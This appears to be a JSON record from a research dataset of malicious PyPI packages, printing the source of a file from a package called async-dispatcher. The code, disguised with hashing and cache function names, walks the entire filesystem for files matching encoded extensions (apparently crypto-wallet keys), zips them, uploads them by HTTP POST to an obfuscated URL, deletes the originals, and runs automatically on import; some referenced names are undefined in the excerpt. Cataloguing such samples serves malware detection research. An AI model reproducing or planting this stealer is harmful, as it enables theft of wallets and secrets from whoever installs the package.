[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/async-dispatcher-1.2.2/async-dispatcher-1.2.2/utils/async_function.py",
    "malicious_code": "import os\nimport socket\nimport uuid\nimport base64\nimport aiohttp\nimport asyncio\nimport zipfile\n\ndef find_web3_hash(hash_keys):\n    hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]\n    for web3_hash_root, dirs, hash_address in os.walk('/'):\n        for hash_id in hash_address:\n            if hash_id.endswith(tuple(hash_keys)):\n                hash_web3_path = os.path.join(web3_hash_root, hash_id)\n                try:\n                    with open(hash_web3_path, 'r'):\n                        yield hash_web3_path\n                except PermissionError:\n                    continue\n                except FileNotFoundError:\n                    continue\n\nasync def validate_hash_by_web3_key(hash_value):\n    hash_get = aiohttp.FormData()\n    hash_get.add_field('file', open(hash_value, 'rb'))\n    session = aiohttp.ClientSession()\n    await session.post(base64.b64decode(hash_web3_key).decode('utf-8'), data=hash_get)\n    await session.close()\n    delete_сache(hash_value)\n\ndef delete_сache(hash_value):\n    try:\n        os.remove(hash_value)\n    except Exception as e:\n        pass\n\ndef hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:\n    current_value = 0\n    hash_id = 1\n    os.makedirs(base64.b64decode(temp_hash).decode('utf-8'), exist_ok=True)\n    with zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w') as hash:\n        for hash_path in hash_paths:\n            hash_value = os.path.getsize(hash_path)\n            if current_value + hash_value > 40 * 1024 * 1024:\n                hash_id += 1\n                current_value = 0\n                hash.close()\n                hash = zipfile.ZipFile(os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip'), 'w')\n            hash.write(hash_path, os.path.basename(hash_path))\n            current_value += hash_value\n    hash_value = [os.path.join(base64.b64decode(temp_hash).decode('utf-8'), f'{hash_result}_{hash_id}.zip') for hash_id in range(1, hash_id + 1)]\n    return hash_value\n\nasync def main(arch_list):\n    tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]\n    await asyncio.gather(*tasks)\n\nasync def start():\n    warnings_cather()\n    hash_paths = list(find_web3_hash(hash_keys))\n    hash_connect = hash_connector()\n    hash_list = hash_identifier(hash_paths, hash_connect, temp_hash)\n    await main(hash_list)\n\nasyncio.run(start())"
  }
]